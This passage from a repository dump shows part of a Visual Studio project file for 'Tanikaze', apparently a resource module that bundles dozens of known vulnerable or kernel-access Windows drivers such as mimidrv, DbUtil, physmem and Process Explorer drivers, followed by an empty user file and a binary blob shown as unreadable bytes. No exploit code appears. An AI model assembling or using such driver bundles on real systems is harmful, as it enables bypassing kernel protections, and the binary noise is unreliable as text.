      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\asio2.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\DirectIo64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\gmerdrv.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\DbUtil2_3.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\mimidrv.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\kprocesshacker.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\dbutildrv2.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="data\dbutilcat.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="data\dbutilinf.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="data\KMUEXE.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="data\KMUSIG.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\dbk64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\AsIO3.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="data\AsusCertService.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\HW64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\SysDrv3S.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\amsdk.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\inpoutx64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\mktoolsx64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\DirectIo64_2.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\AsrDrv106.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\ALSysIO64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\AMDRyzenMasterDriver.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\physmem.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\procexp1627.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\procexp1702.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\LDD.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\pcdsrvc_x64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\heavenluo.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\etdsupp.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\KExplore.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\KObjExp.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\KRegExp.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\echo_driver.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\nvoclock.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\irec.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\rzpnk.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\PhyDMACC.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\PdFwKrnl.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\AODDriver215.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\phymem_panda.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\wnBios64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\eleetx1.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\AxtuDrv.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\AppShopDrv103.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\AsrDrv107n.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\AsrDrv107.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\pmxdrv64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\HwRwDrv.x64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\NeacSafe64.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="data\NeacSafe64Cat.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\ThrottleStop.bin">
      <Filter>Resource Files</Filter>
    </None>
    <None Include="drv\TPwSav.bin">
      <Filter>Resource Files</Filter>
    </None>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`Source/Tanikaze/Tanikaze.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup />
</Project>
```

`Source/Tanikaze/data/KMUEXE.bin`:

```bin
°€°7ß¿D»•°zæË’U¸rV)·6HÜOŽJ(÷ñ:t†œxvx?“dèá!ƒïa%Üõ|û \ò+rb–#…›ÏÒ}k·¼uqëS°Þ y:õ¦jTÔÔ`^ýÏ]
—i¡éHñ®:!$Q ;¾”-?ÐàæèU\Z¾QIA€i—2ÑtX5Ø•I>wîb1.}iŒD`T(d ÓÁ+ötA×¤%¡aùoºåûìÀ:H–¹pFO„XOU1`ö$¨a€BîzC†Ï|;V‡IÛæÄ ¼à£\â}€2áò¥<x@­éÂ0œ	ã¯ŽêDDu§zVYzÁÒÁHŸ‹$#™&ÒovÇiAYÛ—iŠF·û°u*ÍuÅû<-j-x©[Òâ„6B£çºDÑS“FZ©…e–… àÑ³ÿ[¶à¾ë®q/¾ìØ¸åUš4™sÊÀX¢*vrv3ñ+²ø\¸bß¡#j¸²^`û“¬1ÊRS¾nâÃ{‰fQ¦Jâ% !“®€hDDÊ™fâFÙZÍYÁ8rA$¬•ˆåic?ºëæ0æXû÷\¼Œ0²¯`ôŸ 9s$:Ž&Wknà‡G\ÿ.X¯[4‘º»èÅuâ!€ÿ5ç8^÷¸Âvîˆ9æ ‡Ö¥˜‘¥3ôo$®ÔþÐ“È0‰Îë¤_uƒpÇ³TŽ?¯_ëž:¬ÀÕ‰ŸÚµ¾%@¢‰àÝ¢5Æ÷q"ƒ'¬Ü¥÷¯vúÆ›ÓÄ<…÷þØ…æá®SlFeÆkiÝjÛ´Áÿ¡+×¢5Šœøþà¢~Ô~bÒ˜ J(­H:CZÇS/ÐÖ	¿å/eí:mj•™RÜfayÐ‰þÅu}DÚb(û¡Ù”7|±Éó­Ôñ/°¿"×>ñùñZáó3úfçƒi ±¡¼]Ž\óâ“òæ£•%¿hƒJæLdœbS¥‘†Ü	Ø3óxÝ0Ä¨)]S1CöNÉn|§lQWS0w—Å½7ƒŠ–fmNÒ{AHUéÙUŒÀëgÿ‰qVê•unëÙÑYþ¶‰ÚïbÒä9`Q††õHˆ,{+î€ý_Êêj[ˆqŒÇ&sTÌ»Ap½%e¼£ÑM§->Y»'SÍ£fÒ'«œÅ&wDf•oZë`Ë¯=0´¯eôùBØÔñŽÒÏÏŽÐÄ¹^?:ˆÄîÅ‹›ù2Øïo
u4xBÑìÆ³g¥]¡ÝÌ«ðöÏ?lýÅ0ÑG ¼§È9€R–b“©P'ÎèPö‚„RU,4W>lmŽ=wßªKôrêØ;ÑÓè_—«;OsãXHGkŸµ‰š˜VEÖyþúU„ì!¥{ºªdSßªÛ2½´câ^$Å¶:@ú6q³¼UŽ¢‹T’ãàŽ¹ûwöÔØ*×ÄŽtôç°éÖ–¢yº³×(ØÔé
Dí‘ÛRºîË¸&ÅþÖ:hÀNÚ3oƒÈÏ8qÐ_‡/n¼ÂÕVê„UÀlAE ,~ÇA;W˜÷À¼%²j“5ÐU‡„N/ÒEÎgÆ·YHˆÃ#ÄÕØpçy½‰ÏZûªæÄöû4SþgfF¯Ü

-Ø, =¢×œ
c:í½3‹}äÌëæPƒ«ôÄÁ+¦P[©Ñ:·P<'®n}hF+$‹[¶eÁô›ÌH1YlQd;pçÆ|º,S/&¶tÕïâ!ÛZc$(uç8ŒW™£Z?¢€¸J@éŒ’ä©kšÍêñ¢#ÄyX}¸»ÈÖ!Íf«ÑfP>®õÿk*²…‘òPöåˆÚ‰×ˆWË”øÛN£ieAH @ÊÐB6ƒˆRaRù¼?½&¥®×ûèÝ‘ëâ3ý`ß	âœã%;h@Õ1àÄ7
®ÏìíÂ8`à¸±gµtÿ<ö.&lƒXB¬ÍçjHmºÍÙB6ß¸!‹—¾dóÁó úc¯/yTQ»Býö$AˆJØ5 3
¼Œ{ì#‡x#[Hü£ðÙxÚeŽ„W&'‡P¶2èîñ¥Æ1R“Í=zÀn¡#.Šx=µÑ‘ üâw	¯ºÌx8Í‘ Z7Ì‘g@ŸºçA¾B©$AÝíú8pùñÓ”j2aA5eæà¯$„Ý/t~Ó*È 0Aß-0zl|ï¥­Œ›Œn5*ã«©—‡»5 ¾H\Æ!>æø"ÒÔSWl<¥˜Q‡y‹­)x
R=2©ôžý?qCð¼ªƒLÔ_^!Â¤ÿ™r¢]ÝIÖüÊ¾š9ü0
m¡¸ò÷eÜy;ˆcÿy:oo²‚|&†<¤¼(É‰ð ^J<8º/¦âùSLÓƒ6Q®ƒÀ“Nk-Qð72žf”†ÑGP'éeø$¡MZRï6«eqþ%N]Ý>‰GÝûó­D.žo<)º²„Dõ¼I©)ÿ‘¬±Ö!¶lB™.T¬,kÐ×í¡ÓÄÊyé&qí§šOÇ(4„wm¾uµ¼¼úDäÌEŠÃVÕÃâ£³.êIU	ž.ñ—h´‹´.‰Åïv…Æfº›‚9þÅò±Þ4H×ºô\5ûÞÐâ[P…ÕjÓxšöÄgÝ'g¬,ä§¥È§2ÀÙÊòI7ÜÌ†³b€sñ[7dêvËUC"^ÌxƒJœãù4Ä¶Íáï>×{éþ3Ž	Dßüœ™õéx	´n×[‹à§ä/ôöžxrezçZÕòÿÝ’Y dXþgx+À‹918AÙ>õì‡­qS©¡™(´Çž19± À¦¢ƒQR?\ázžs]»ûo\ž^’*îúGhŸ=”³Â£ž?ºxK9àCµwš0‘žkþ£œî&l|ãwôŠ\fl:>)`[ø?S‘§|)ðÉqúRha•˜;Krã«¥gé7‡3Ï@zÎuMk!Ã²óÙÏ~!âyyŸ‰¥Öq3;E°DðÅ^ÅÈE2x¶÷£ÉôÛ¼Ñ¿à°<ÜT%k\€…³VÉB$5,<[¿ÖŠä€l«Õ*Ýø€Î$”HkAš¯Göùæ<DgðW#»nT	Þ ÈÆÁÌs{ªàŽjiDp¡"…Á$çí =ásúo¹³ŒQMÔ×ŽÒdÅòË¨N2þ³¦6`cá¤}†ŠNÒõ@ÖÚž8ÖÓÞ Ep"9:4ñz!99IÜ=Ïò?ˆø¯ì^£ª¡‹©9dkä#›Ë2×7mäÙžrµÏÕ&³˜4½œL‰ITí‹ªVR
%Âš¹hï†R®A²ºäcÝ=o^êFà˜ppt:áéã²¹§ƒ:Šô§äZÈåÄµå_Dð)²Tä	+FûGøÒ¸‡Ä²99%~þ1E°úh9^?TjbžnÊÆr;=Ö¥ˆÝó´V Ì7‰„PQì®;êlEB>¿‡ ü?	4‡@¶2IÌ~ø*W.`³¬Ú¡t	cçpû-!´ëPù+KïÆJnÙ'8¸iºy@øÌQ]Z`m%àT-Å§û¯ÛcØ:Øæ<LIÀržÜÅüÛ¢A;ãæ”áj`ê(çT
dq‘¸òOÇTpÒQj¶c|eÀ&è3Î9½æ>KzÌâ8 ÊÊ½¸CüÃ@ýy 'v<g¨É=ÖjF³ö?·Iêãc$ú'ñ|£.YnÉp5a .0üt¶;vÓŽ‹í¦rìYŠ_æýA|5F<÷G#›CZà{}°¿Ù.n+e‹I“ÝBg62GµîèXB‡¼‹b,×ÊÅ/ùoÌ´„½ ý•{–†fe¥”ÙfLp:„.Á¦ðúë&âûÑì´:°?R©|$BÔýHÇ¬·ú€.+VÐ£féÑO·´L£xL§H6ìRá¥²6) sûÊ¸Ë–’¸0c{É¨)á˜Pm@2™_5ôUyø,¦[H?5¥ö™`Ž¬¾¢|á}Õßnò[TïÁ8­'˜Vøë+±°a¹¡Ñ"9‘ ÆžÊ‰ò/CvuÛ•B¸®u¥¶o0- GŽ¦WÔ%ëäˆ`œgdú=ÅD*ºoÿMÐ+[²Ú%rüíÏWÏ­¼y°€¹K4Ü¦¦—*b¢zîÔ'X=Ò„¿ªÛ¨ØÞˆ—6±Gx2y;yêÓåZ/à6”òyñÏòx€ƒøFMl£Èy½~ÝÑÐ¢YšŸk‡×Ñ|X 5¥›ûÎc†qç4.V2u–Ÿ%ÃÙ“Ê.ÀaÊe-Ö€%X7Æ&²Ÿ»ßÙ\Ö^‚Û÷bUªÇp­,ækjƒC¥¦™›Å²­Þ½‹E¾Åî í4ªµvwâwuõe2]ý9ñÇø×½»œº
W$Èþxu¦nÀØíQP_¢r¾àU¤?3\¥5`¶[~Tªòj×Ð)¬”éÁÔe×WgÐe]ž‹†Ñ5÷hš*²É„½§d_Ëv…ïï#G#‹‡tÉ.§`Š&ØµåÍiã½¢K…NlôÔó¼NLôïN|IoC¬`*.ÝÕ4úÂÙ¨äI¡Ý„0ú@H¦ÐaR{û>Cp)su}Ýr3ÃÎ¿Ø0*Ÿ£=^hxä³¤kxA<Ü\‚0%=›ïÚp‰ŽMê®öø</ø!zÚ9,è
¾ü]žW Ãt»>ô¡Ô¾SÕh§4«˜Â'Ù«£XO›ò¹‹Ò¬¯Kå9A{"Ør$CÀK?
}Ô›C(Ö‚!s;Ä [¯
ÎnÚˆT2CwERÓ’¥ƒïÄ³Dqh‡W}^*F´ÃQÂ6ïéewS[Ì! h'€“:–ùî!ÍxS$î®êkpÑ?Føœc×hH&5ŸÓp}BóVÃËÞ¦Åõ°Qô•ú³Ï~g7( »ß^&Èý ÙT§!ãÜq¤úe£kÐN~5'×exƒ`OP¿
Xí™Àük6±BxÝûI îü€µòÂ9Ë}
¶hšÅ7ó(w]ãsþ”âpÔØŸOàfF”©Kƒ³nuCÌÖ¨¶ÿî
¦ò´â`ÔÈŸ_°uíB¼ Á[wŽÇ>Èú]!øä”úˆá!c9ª²Ž”Y¤&˜çö³ÁŸIfóoz~’fŽ±:rVÖC@¨d½ó>Ü`»ä¾XXåÍÁ&Dmyô±ý³‚_ÏåÀÓ¬Ô{ÞšÜp6ö†Aui/¿N»ºxÜÑ¢Ñ1éŒÂŸmx5õ@Yü×rÎ@wÉjÇí¼éèÃT”æ`ó Ô)JJŽŠŸ>¡?°ù·ÈŠÇRí4L÷M¬hŽ³ïVF~ =ÅFæäQ9]Ñ?WX¥-èãÿ£QRFq—zN>±J§µ‡0vŽÜú9‹´ˆÆŒ¥—5g
Ü¨vçáæ°u’ìüBŒóËÅ›wÿñ, }GéÆ¡±~¾Ä`ý„¿EP,û±ã´¨1—8öQõ%]Ÿ¬8Ÿ§£ÿå=ãú1Æ°šˆ©ÞþVÏkiÆeB½“™Mœ'‘@/ø;­oõ|Hyç½~¸ý,×8ûÀ
{¼ß[MÃ\öY¡v	3àxìÒqõ "™QÖßXÝŒ7NÏ)°5+b&S Š/¥©%ÅÖë9–eâ\Æ‰€ËUD¸™›ãæj€Ë]·~œÁµ÷¦öò$8³‹^òû}k98Í]È<¤`i}Bjíóÿ‘£‡'â§›o´w ‡¢ÈRô×Eò+»ˆŒƒçü‹ÌÞÓúÀ§ýŠÜÉGzðó”³IµìŽõ”ãMenAè³ã8h–‰JPwâÕ°
`„d€*¢­&€D2¦•aÕw
Aa¶Ê‹ »šÚŸâÌ–ÿzezaSª [©5œT›+Ä'ùßÖ0´®§ÀN¼ÂJÿeŠé÷¥Ÿ³™Ñ ŽÖt%h}V®€T¥,rW¹”ñéD”?W—™Ñ8—¤K@ubêŠÓùœ¢ü5&¡ý«=Ü…yF#×\ÒfR\ï Ô×6]£'vM¤ËÉµUa`íŠ5'ŸÐâ+/l$â™û«à6»aÄ¨7ŸÏù„ºÖÌ°G1†‹ôØ—ÿ”:öîïÒ£6ì". Ø¯Û—°ù<årAµWWÕ(×Ç0w×rRb–Ð«¨V œ±¹G3+RkìÆâáP¹øhýKYíï8¾´å¬”²rm(zOR#¡‹V9ènËÄ`=sDbÞ,‰Í°LÓP‚.
ÌYe¸Í Ié¾gÊÌJt«°uŒ²NrWÁTã/Ó:¤
&«0fohâoöRtþéÑŒQÉ„ýíC'TNûÙ¨xµk-ð.ƒÌáh4šž´•IèçQT	Æp)ô/P­4d´2álš¤‡í»ŽóX‡M˜sŒ 43RùÓ&­‰Ú ;Zo@>Ì§¦!À’µ¶zf§¶Bál4¡{çÏf,@Q°O„>Ô_u-¬ñZ€ëJ8d0CùÆ’}bÒf?c1È©cÝè	ëãÙ-HfY'D}ù³µÐ=h¥á»#$TGp!ã4ˆ1¦Y@'04ƒ¬OçÁ±+x±Oè®þ$ï±×K¯‚ç14Xã´a¦7Gá§ïFD_oG»Å&€wIôð
z¸¬¥UZ°R5ÊM¯'˜köè±/ÝÚïo¥íûDÆYZf›ŸûªŸTrsFFæëXê¾K8èªÖ¹.MJ¨V/&j2,ñnÅ['©Íäpòq˜'
>úü´BÔDîB×G€Bèw6¥ÁÌ¸:,¹…'éÜ×eŽ¬N6 ží7Y¼â3âÍ•ÆÏ§¬.t«Q{ZÇqÚÓžWnÈ*Ø¹:R*­ò}åªàò×0`™âñF®!X«ðþË¬Z]·RÕÙï» ð-9nëàÙÕ[fC°šËV{5P£óR]/ˆ¦Ee“=­%d%B¦·¼
µ—­_,Üã9(x¬œ An•	|øFœóŽé|Iïv­†…5û®OÎ"¤'Éw[QX ¤C_Rp‘!`ç…:(œ*!ÖNs§M”d¶è*§É%ÒcHJ€ó° h$I¡®œk#OÇ½=ß7¨½¿øo]äy­ÔÞ›ëî'ÎCzw…àkº1·ãœ¿]þŽ`Ëym•¯M ²ÒoRÙüšÜ_Á ËÈP§eß¶w
•à#¯\•s—j[Ê¹’}Y¶íŽ˜z'å§©ôMxL+W.ØùF|¨ÃíJdÊ¨;$ øp¨°çã±ÎÔÂ¹ ïÝ¶îëp¾¡­ZãR¢<»ÀëS1V œgçoI°œ’~UØ7êc[û5QÁ¸ðÆÀãi"úã†žb€Ò}&.@j’?7A{sÊ°´KÔQ¶aZçžéåR»£+Í3NÊÐ®„¨Ñ'cñ`o×²uÑe34ÉÜNÏÐd¸þ÷ù‚ œ‹&`$·“£Åb¹-q¢1o1È<sª„{ÛË6!|Y0_%ß2’h)M[|2“žû°*yDo?þfÉZ7=PcÝqœ pÂ0å:ÐSTŽ!`š_½3»$'ÕÛFÉ\î7›AúrtíïR¡uûãß8±a«Œ,P>üöÐ"„#«ÑSA¸]y`~;¿fÁ¨R‰kÅe²äg/¬#à^˜Õƒ®'Ærõã}à™ ]çÜ€·„|Eh
çë’Æ˜–ÖoíBJª’c÷bÃ#¼¼)V8®éßžÌ9ÀGY¢µÉ‘ÔUqôæ‰d¡¦PÙsÆ>ˆÜÎÖi/¶äÈ &Æ‹;„¿CÅE¥ÂÕËÂ S“X²W†ÛzO‘m^•Ð˜Jì„¥à„AÁNæßjûN€m‰J„Ñ1²ê&þ 1Ÿ=¿¯î91Àéwµ>G«YLªxVN,AcÈN6ÙðÄWØªm^4Òu‹üº6b¥s^T†…¡ànº¹Ù©\?aJ1	áE`®ŸjÈe†uWSUõy’.èˆZT#ßÙÚPÇ…2~i½pHè{R½ïIeYéè#ž’{žú®ÅíðIÕ*ê/M¥¸až6sEáøzî‰–¥Øeûô^
é}6·õ~ëÑyu²0ØäÕ¡!¯¹6á˜r1Ý€“ÛŠ¿£â¦	êÐû¶´`ûq;†l¦§W±º¦nêN¥ýqûˆ"WNù2×=´ò™ÂÿçíjL>FkþemÊÓ+}¤Sçþ,ÌÖ•1$òîMÕUŠqþ]H¼e@,“Øüæ¥ÍàHÛÇŽ÷±û¬äWB¿â]«éCÇDÒuÝ[=X©¨ß˜é]òqŸóÈá•ãï¹­ã]Ï"4÷AåÓ_E7u¤N­è\Ÿ®ªW× klâ2X|ÎX‘Óªb€ˆ‘ÎšV.è ¥è^J`œÿ\WA|j›¢ÃO+ží™c¶;§
ùþ;€Ä‹Wä˜zƒ=AöA§´ðaX†tÔôEcéAœ“QÂü‹Åd*Àá^ì”YéCE¶¹’’ÿ¿^¥­Öi®ðC3ùƒ7?·ù«p]t	“côpÑšù .©c]ú¶Ô¡n‚¯C»»O¶Ñ¾ƒ™æ«Ôì¶ˆÚánÏ’l˜Ü¿¯Zê(HéH±ÝùŸÕý ¿Î‹kôKdl7Q§pŽæ+tâOxñ…v“¢{ -¦’Â\º“ŽIñl+“ÛQÀòUw¬ïu<B‘Ù9ÃwŒÐ¾‚–´Â ö9Ë?Ì­zÀÊBˆü1Wë Î›Qb"[\áßwEÁIñ¦3K’ûïZÂØÖl"_|Å¥Vö¬>[%;
-¹'ÈñÑÛä&œWõñÃGô[eÝ48XÜP¤SÚ—C/á>VãoHž·ƒbúIxÜ~4ú`³×èó×W{¬©ãÈH&«jµöÙbt½~|ÅŒv„îàgN¡XÚŒØ¸va}llRÄräÝª»#êµì”„Q >qêÄ†i¿ÔLè<A5Jc´W4—éß©ÄùM&çß
ô~!û¤“k´Ö~óêžâÇŸ‘¹mW*´¥¤R$ÊÂÍsÔuŸÝê¥ÂÇØŒf·&Wf^$×vH'A°öë.þ³Üg¢êjñÁÕÈ¨yÙUß¹èw™W3½¢û‘Ñ³æ.MkþhYqÙhø¥h»¢W#À»-ë5æQ’æ«Âó"|XAçbÀƒkp)Ü€2ž¿’µÙ{ö5ù
¹ù{=‘ªÌŽ-x-$C(ÿ4*Þì,®a“»ÕÏÎJß4B
$±b23¦Œ]b¢ºB)€éB<B”é‹¬d"v‰äGòÑä’QåLnÓøMº´ËùÆíEÈŸG?hÈ¾ªü³3‘ÜéËRu¬sw17SØóûª;èL;ãƒ?Þ\½1Ö±ñ…¶^MœDž@Á›aç+Åuyl€-ôè†<Z¨úe¦ÌOúªóšnžJz¨4Žƒ6=#sËÌ°± ½‹ëþtõþ–Œ<ô¥Àøâßc¸NÀáï–E}Ë–×!Árþ	y¡c"D¨’Ysšt`àv2›Ôô]SÆa³²Õ{¦ÒÅÅFß†­«;øáÞ\í¬i*=?­5®aÑª`~‘ª»ÑÇu£czŸ`˜©!0^²6,qXáäÿ“SQù´ÅÒ™e:ÒÚ¨q?”=|›úûÀ1£¦Ç9„æt%µ,™žî_‘¹îÅ‚²J+gB¯ýSà¥Š£‹çê³“6’•Ž£{rO¢zJÁ“Zª;ß)7ÍYb–»%A&Æ™²:7ÕJà³òDUe{ÊÏmÔ(5¹Ó•1g2¤Ì¦ˆ3òL%èdÉîÕ ‹„q’K±D»q Ü{0L>ç¡^áß‘êiqÃ²Â:O!]Ù.X¢ÿtÛ˜!<~½·P~œ,¨(S¶€âæD­×Óôl¿Ü6|(^Ãbá¤iµa¨í1-ó±ÂJÞòà9ƒv X¶<Û(Ù¼p/ºéÐÕ¹€¸~–)?F1
—Ï‰/dlPyVÆÁµÆ¼¤]¹mKÚÏò´÷ùÆ¹‰ÂAÌÄû¨ F(n±_²úhf&1<H±¯ÕßÚâñšÇHóOPýv°èy5m‘ÐwÁïÐzE² [Ú¢”=R…çí}VÒ0Â¶9=­õ?šÏÏ«ÈFvS‡œ]uô+Ï¦Ããg¡,w2ñ:ÙH
ÓéƒzÕ“Ï{]\­†Ç…¸K®H³QCuÁ½î ¿:WÑŸ#z¿{q‰/“eº;à=—BÂÌ}•ž%_’ÖñC-$qô½º'º'ph
È‹4.ÈÌÎdQ1ÏUá<º7ÅŸÂÞ±0K“Ø¹,\‚ï 5ðøÈ9ª}ÞÍ³%$£b¦jˆêsEx]ÃI9†p}³.lÙðÆŽõÅ<~<—š=j•YÐÒn·±5²Æ§Ag·Ù}äk	DÏð7#Ñ—VØá„BîAñ–UAvËòø0–Ì?ÉZ€ëÈÊÿ¬˜çª% 1Àm7ÔÔÔšÈÚ-F…âeHï˜E{ûe„ýû¯å…€r5óéÉÖË"RU‚Ùà‚–X÷TvÛP‡­¸=ƒSÑ3¸Ì"»FJZˆW¹­Ì],¶	f®šÎæ9- EŽ•ÑŽÓSï[6ÕrÞ²pÌ6ì½°9b:óÅ€IfÝO7é5Äs¥oÏº¼ ¦cÁz6'ÂÎt¿~'Uó§ kZ¼ã 1<ikœ®¶gÀ¬¦´&:JŽgšøàò™­y>Î+»VÜ	Eà&)]F%þD'xþ%:ŠLêñÞ{:¥
2;ÛòG¤\Þ2b¸—¤K[·Ü\à•’Å¬<–t·¹œp”Q¦DiöÓ¹SC…QzKyÏÖ"AHP™ÕÌ=Dú9 •¹ä9#7
mc!šx!0v™wß'ž‘ÝZþîÌSÛ×ðqÁk†À×‡ùËB\vä>œÎÚ£íhP–º,¡¸’ÀÀáó·Ð’ƒT8_"'ú ææN’—¦Ñ­=Fr¨*Ä¬z[gÜ•ó+i¥ $Z?&_ïôÅ3³}ÙÇJ:;@Eößçcš©æ@xëÝeY[ÕÓKß»,pÚ(K¼ˆ…ËZyë60Ÿ®>ŒÄìo™c÷©š×ùhÂLYñçe5Ü§ë·"ïz¡[a`»“ÿ`omÜMeÝúDÐw3Äæº… ýC©±c£@Ó/ˆúàºîÊR¹ Rëê¶Ÿ™·ÁÓ¬Âwéé+ü)÷]ÓÐ¸ÃbòB”·¥v×.‡åÏ&t#n7RPOÜKs°É½]ÔsÑos‰FÇÔül«M¡ÐÒ»ÁÃ+µÖcFì
ÖiG9´iµ¦¯ó¿ëS÷.‡‡«xKúPJô k˜,‘‘éi(ÁJ³^ä¸Zõ™;„4vkóàdwÉ÷äà(¨…áÛÜ[0ÉsÃ4%´7bÚZXÿÃ1ÿÞ‡Îe³ Áµ6¡<*ûn•hšj}t²½~5XJu^h‰C`}¤k¶šÖYÚùð_ ­HÌ¸EFIHœ)ˆp}±Œ*¯ášu(ªçænmÂNiÕpHüÏ`Ÿé©xýÐÖFé‡(ââ÷¿…4a_76vg0,
\¼´ZâtAË„}“bUý‹BB2’¸	Ç)ƒ×ý|]³ÈÓ¼¤™6ã¡{~r õ;rvGÝšWÉ”¯âáQÙlò~&X»ïƒ¸èn·D„z‘	ÜðdWmµÅ0®OÙöâÃZ¶§äeçP¬ˆsí!BëDoÂøþ­¡·ŒªmˆP\ˆš7³ˆÀ ¯Ûôƒ(¸ÄçVeVÝµš‹`†[•ÿ¯5Ð¿¾Î¿²:Z®0C°•´Ÿ.Œj¹Hàá5pÊókÒÞ²æ†Ø¸ðT$œœfa4Ó  f•=Ïq{+.~ˆ8¸(¯œø©þø‚Eô‡ZÞÞ’0Úu@cùn!$:¸n%×.Ó¦š¨'f­O‚kQO8ú2û­€* Ì^ù“ÇÁí:o‰”tÈÍÈù¢þ`'3~²…ýÖûôF¾z
S.œmšÁlé—æšägå¦ñì|”²ACço› É…€—ÑwÒ§¾·’½\õ¨ÃeIæµèÂŸ“¦^áþx3f?¹‹ŽK+U¹ø ‹ÈwÞ’Y—ˆ·;½Pë‹‹)ßôDr¦nÙÕqÏYzv³ßàÌ€ìÌiYAs—^&_{øyàzñ_ó•séŒÑŸQZ,<òNWé3#öiW¾õ~‚2šÐžÄ÷*³Uó¸¾jÐÇ(µWHÏ¸o,Ê ’lº/älnW=FÔ×ãúx@3Iî>aBÓk|Vs‘Ç?NaÇõÁ>qÜ~þî+ø-52û©%›v^_¨½}wC Ò`%ùÞi]ñ’P»B13\Þ7ƒ5*
ìÍØÛ¹7ø’[‡y4Ý3^ WÀ~Ä:­x¬ÞYÞ`-¸´:`7±Ð©XE,ÇGòÐYCŒäœŽ³/ŽÙzÇÚq_üî_*/¨Yç9WW„1W")à€R¿è§Bð8Èt{‹ Þ—klüh@ÒaoÐÙ–…wúcÛ(ÒÍ“™Ò˜s–£Q@òÁ}?«i4,Îµ÷* Ð{«#î¤xçÉ$±[&ÌÈ_î¼v¥2)?V=VDÄ¨V(ÿuè1gF˜µ£çÜgZ —þ[»ÅûïíÊ‚ßìk$tÔ|çT°Sø>Æ¼Av±À©°Êž&anK–Q9EŽàpeµÕŸy¹”ã•MÈ¬€3J7G‹"
& ¦÷:§Øù\-uÑ)ƒ¬ÉŽ¿ÖyÅ£™YXºÖ=«`™!K”Þ¡Ý‚ý%\ïd®hú‡Ikþp],áö1u«ùÈ_˜‚2,¹lX1ýüÙ$Ò%¼^]hfòÛ/g³m×‘ª¬z˜”†þÿ˜fª´¡ Óêë¯tX. ÝR‹·¬¤d|Ó\ö¹ªªzfË!<=Í©³Í1,‡í‹<*…HjÔãþ-4‚øˆ€µº§ªoR¡ç¾E_LG8.ß‘Î¼¤Ì›QïD>5Ð³m
Ç6÷XÇ‡a‘4ú^ùwbIy©¡b©³¸ÙÚdpÌ+"èJUã+|««ë™/À 	Ÿ~«é¡ ]ÔÞUÊŠèåÂÆ>øämtšñÛ3Š:!gx¾žª/öMÀœ—ãL•¯Â ß\N÷>•”CŸÍ§è+X6~{ÛÒÛü?	6…Mnøˆ	
à]L¬=Ã~@S\?AnÚËŽ"æ¦Åª×'É—qá¸ä˜¼¤iE$v!ÓÐF/ÞËâ ÅžGG$Ëa\s-#Ç¡¥«Ål‘xŠûÛ´ÉŸB$+Ž©ØÃã›Ý#5X÷P¶/†cØÏß8ÌCò¨Å.ß5Õ•I†´h¾L‰_Ú®o§ÚüéæßÕúO±ž{ åYÞlLù"4@ RoqÄZ!·SÖ ï ^
